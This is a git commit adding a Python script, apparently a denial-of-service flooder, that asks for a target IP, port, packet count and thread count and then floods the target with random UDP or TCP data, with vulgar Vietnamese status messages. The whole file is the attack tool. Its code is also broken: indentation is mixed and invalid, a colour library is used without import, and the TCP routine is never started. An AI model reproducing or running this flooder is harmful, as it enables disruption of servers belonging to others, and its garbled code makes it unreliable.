dc1de5f285f229f8e6fae5c2d2b95589f23bb64d
VietTien <121381688+TienKanZuto@users.noreply.github.com>
2024-03-03 22:12:49 +0700

    succac

---
+++ succac.py
@@ -0,0 +1,89 @@
+import random
+import socket
+import threading
+
+
+print("""
+
+   ▄████████ ███    █▄   ▄████████       ▄████████    ▄████████  ▄████████ 
+  ███    ███ ███    ███ ███    ███      ███    ███   ███    ███ ███    ███ 
+  ███    █▀  ███    ███ ███    █▀       ███    █▀    ███    ███ ███    █▀  
+  ███        ███    ███ ███             ███          ███    ███ ███        
+▀███████████ ███    ███ ███             ███        ▀███████████ ███        
+         ███ ███    ███ ███    █▄       ███    █▄    ███    ███ ███    █▄  
+   ▄█    ███ ███    ███ ███    ███      ███    ███   ███    ███ ███    ███ 
+ ▄████████▀  ████████▀  ████████▀       ████████▀    ███    █▀  ████████▀  
+                                                                          
+  
+""")
+choice = str(input("Hello World !"))
+ip= str(input(" Taget IP :"))
+port= int(input(" Port :"))
+times= int(input(" Times :"))
+threads= int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[-]","[•]","[×]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(Fore.LIGHTRED_EX+"Attacking...")
+    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever l: ")
+    print("╔═════════════════")
+    print(f"║ IP    : {ip}   ")
+    print(f"║ Port  : {port} ")
+    print(f"║ Times   : {times}")
+    print(f"║ Threads : {threads} ")  
+    print("╚═════════════════")
+		except:
+			 print(Fore.LIGHTRED_EX+"Attacking...")
+    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever: ")
+    print("╔═════════════════")
+    print(f"║ IP    : {ip}   ")
+    print(f"║ Port  : {port} ")
+    print(f"║ Times   : {times}")
+    print(f"║ Threads : {threads} ")  
+    print(f"║ Ngum Me Sever Roi ! ")  
+    print("╚═════════════════")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[-]","[•]","[×]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			 print(Fore.LIGHTRED_EX+"Attacking...")
+    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever: ")
+    print("╔═════════════════")
+    print(f"║ IP    : {ip}   ")
+    print(f"║ Port  : {port} ")
+    print(f"║ Times   : {times}")
+    print(f"║ Threads : {threads} ")  
+    print("╚═════════════════")
+		except:
+			s.close()
+			print(Fore.LIGHTRED_EX+"Attacking...")
+    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever: ")
+    print("╔═════════════════")
+    print(f"║ IP    : {ip}   ")
+    print(f"║ Port  : {port} ")
+    print(f"║ Times   : {times}")
+    print(f"║ Threads : {threads} ")  
+    print(f"║ Ngum Me Sever Roi ! ")  
+    print("╚═════════════════")
+            
+for y in range(threads):
+	if choice == 'z3n1tx':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+	print("╔═════════════════")
+    print(f"║Hello World ! ")  
+    print("╚═════════════════")
